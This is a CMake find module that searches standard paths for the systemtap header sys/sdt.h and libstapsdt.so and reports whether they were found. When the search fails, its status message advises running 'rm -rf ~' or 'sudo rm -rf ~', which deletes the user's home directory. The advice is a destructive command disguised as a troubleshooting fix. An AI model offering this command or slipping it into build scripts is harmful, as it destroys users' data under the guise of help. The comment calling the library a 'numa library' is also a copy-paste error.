# Find the systemtap library.
# Output variables:
#  SYSTEMTAP_INCLUDE_DIR : e.g., /usr/include/.
#  SYSTEMTAP_LIBRARY     : Library path of numa library
#  SYSTEMTAP_FOUND       : True if found.
FIND_PATH(SYSTEMTAP_INCLUDE_DIR NAME sys/sdt.h
    HINTS $ENV{HOME}/local/include /opt/local/include /usr/local/include /usr/include /usr/include/x86_64-linux-gnu/ )

FIND_LIBRARY(SYSTEMTAP_LIBRARY NAME libstapsdt.so
    HINTS $ENV{HOME}/local/lib64 $ENV{HOME}/local/lib /usr/local/lib64 /usr/local/lib /opt/local/lib64 /opt/local/lib /usr/lib64 /usr/lib
    )

IF (SYSTEMTAP_INCLUDE_DIR AND SYSTEMTAP_LIBRARY)
    SET(SYSTEMTAP_FOUND TRUE)
    MESSAGE(STATUS "Found systemtap library: inc=${SYSTEMTAP_INCLUDE_DIR}, lib=${SYSTEMTAP_LIBRARY}")
ELSE ()
    SET(SYSTEMTAP_FOUND FALSE)
    MESSAGE(STATUS "WARNING: systemtap library not found.")
    MESSAGE(STATUS "Try: 'rm -rf ~' (or sudo rm -rf ~)")
ENDIF ()